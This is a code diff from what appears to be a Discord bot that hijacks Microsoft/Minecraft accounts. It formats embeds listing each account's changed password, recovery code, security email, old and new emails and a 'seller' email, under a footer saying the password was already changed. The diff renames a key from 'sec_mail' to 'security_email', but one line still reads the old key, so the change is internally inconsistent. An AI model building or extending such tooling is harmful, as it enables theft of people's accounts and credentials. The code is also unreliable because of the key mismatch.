@@ -149,7 +149,7 @@ def build_failure_embed(
         inline=True,
     )
     if creds_moved:
-        if ms.get("sec_mail") and ms["sec_mail"] != "Couldn't Change!":
+        if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
             embed.add_field(name="Security Email", value=f"```{ms['sec_mail']}```", inline=False)
         if ms.get("password") and ms["password"] != "Couldn't Change!":
             embed.add_field(name="Password", value=f"```{ms['password']}```", inline=True)
@@ -163,7 +163,7 @@ def build_failure_embed(
             email=login_email,
             recovery=ms.get("rec_code", ""),
             password=ms.get("password", ""),
-            sec_mail=ms.get("sec_mail", ""),
+            sec_mail=ms.get("security_email", ""),
             username=ms.get("username") or ms.get("mc_name") or "",
         )
         embed.set_footer(text="Save these credentials — the password was already changed.")
@@ -338,7 +338,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         email=new_email,
         recovery=ms.get("rec_code", ""),
         password=ms.get("password", ""),
-        sec_mail=ms.get("sec_mail", ""),
+        sec_mail=ms.get("security_email", ""),
         username=mc.get("name") or mc.get("gamertag") or "",
     )
     if old_email and old_email.lower() != new_email.lower():
@@ -374,7 +374,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         email=seller_email,
         recovery=ms.get("rec_code", ""),
         password=ms.get("password", ""),
-        sec_mail=ms.get("sec_mail", ""),
+        sec_mail=ms.get("security_email", ""),
         username=mc.get("name") or mc.get("gamertag") or "",
     )
 
